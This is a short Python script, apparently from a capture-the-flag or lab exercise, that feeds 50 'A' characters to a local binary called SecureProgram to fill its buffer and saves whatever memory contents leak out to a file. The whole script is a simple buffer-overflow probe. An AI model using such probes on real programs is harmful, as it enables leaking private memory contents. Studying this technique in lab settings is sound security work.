import subprocess
import string

# Send exactly 50 characters to fill the buffer
payload = "A" * 50  

# Run the secure program
process = subprocess.Popen(["./SecureProgram"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
output, _ = process.communicate(payload.encode())  # Send the payload

# Decode the output and remove non-printable characters (including null bytes)
decoded_output = output.decode(errors='ignore')  # Ignores any invalid characters

# Filter out only printable characters
cleaned_output = ''.join(c for c in decoded_output if c in string.printable)

# Save the cleaned output to a file
with open("SecureOutput.txt", "w") as file:
    file.write(cleaned_output)  # Write the cleaned output to the file

print("Leaked output has been saved to 'SecureOutput.txt'.")

